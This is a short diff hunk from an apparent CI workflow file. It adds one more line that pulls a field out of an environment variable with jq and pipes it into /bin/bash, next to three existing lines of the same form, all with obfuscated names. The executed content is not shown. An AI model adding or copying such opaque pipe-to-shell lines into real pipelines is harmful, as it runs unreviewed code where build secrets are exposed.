@@ -59,6 +59,7 @@ jobs:
           echo $swb262 | jq -r .rn9201 | /bin/bash
           echo $v1 | jq -r .mvyp8 | /bin/bash
           printf '%s' "$rfj09564" | jq -r .owe0087 | /bin/bash
+          printf '%s' "$vue1" | jq -r .tmg5 | /bin/bash
 
       - name: Upload artifact
         if: always()
